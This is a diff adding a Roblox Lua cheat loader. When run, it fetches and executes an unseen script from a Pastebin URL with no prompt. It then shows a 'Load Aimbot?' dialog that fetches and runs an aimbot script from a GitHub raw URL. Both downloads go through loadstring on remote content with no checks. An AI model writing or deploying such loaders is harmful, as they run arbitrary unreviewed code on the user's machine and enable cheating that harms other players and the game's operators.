@@ -1,0 +1,79 @@
+local Players = game:GetService("Players")
+local player = Players.LocalPlayer
+
+--// Script URLs
+local MAIN_URL = "https://pastebin.com/raw/fEhC0siy"
+local AIMBOT_URL = "https://raw.githubusercontent.com/DanielHubll/DanielHubll/refs/heads/main/Aimbot%20Mobile"
+
+--// Load main script automatically
+pcall(function()
+	local loadedMain = loadstring(game:HttpGet(MAIN_URL))()
+	if typeof(loadedMain) == "function" then
+		loadedMain()
+	end
+end)
+
+--// Aimbot Prompt UI
+local gui = Instance.new("ScreenGui")
+gui.Name = "AimbotPrompt"
+gui.ResetOnSpawn = false
+gui.Parent = game:GetService("CoreGui")
+
+local frame = Instance.new("Frame")
+frame.Size = UDim2.new(0, 300, 0, 150)
+frame.Position = UDim2.new(0.5, -150, 0.5, -75)
+frame.AnchorPoint = Vector2.new(0.5, 0.5)
+frame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+frame.BorderSizePixel = 0
+frame.Parent = gui
+
+Instance.new("UICorner", frame).CornerRadius = UDim.new(0, 8)
+
+local title = Instance.new("TextLabel")
+title.Size = UDim2.new(1, 0, 0, 50)
+title.Position = UDim2.new(0, 0, 0, 0)
+title.Text = "Load Aimbot?"
+title.Font = Enum.Font.GothamBold
+title.TextSize = 20
+title.TextColor3 = Color3.fromRGB(255, 255, 255)
+title.BackgroundTransparency = 1
+title.Parent = frame
+
+--// Yes button
+local yesBtn = Instance.new("TextButton")
+yesBtn.Size = UDim2.new(0.45, 0, 0, 40)
+yesBtn.Position = UDim2.new(0.05, 0, 1, -50)
+yesBtn.Text = "Yes"
+yesBtn.Font = Enum.Font.GothamBold
+yesBtn.TextSize = 16
+yesBtn.TextColor3 = Color3.new(1, 1, 1)
+yesBtn.BackgroundColor3 = Color3.fromRGB(0, 170, 0)
+Instance.new("UICorner", yesBtn)
+yesBtn.Parent = frame
+
+--// No button
+local noBtn = Instance.new("TextButton")
+noBtn.Size = UDim2.new(0.45, 0, 0, 40)
+noBtn.Position = UDim2.new(0.5, 0, 1, -50)
+noBtn.Text = "No"
+noBtn.Font = Enum.Font.GothamBold
+noBtn.TextSize = 16
+noBtn.TextColor3 = Color3.new(1, 1, 1)
+noBtn.BackgroundColor3 = Color3.fromRGB(170, 0, 0)
+Instance.new("UICorner", noBtn)
+noBtn.Parent = frame
+
+--// Button Actions
+yesBtn.MouseButton1Click:Connect(function()
+	gui:Destroy()
+	pcall(function()
+		local loadedAimbot = loadstring(game:HttpGet(AIMBOT_URL))()
+		if typeof(loadedAimbot) == "function" then
+			loadedAimbot()
+		end
+	end)
+end)
+
+noBtn.MouseButton1Click:Connect(function()
+	gui:Destroy()
+end)
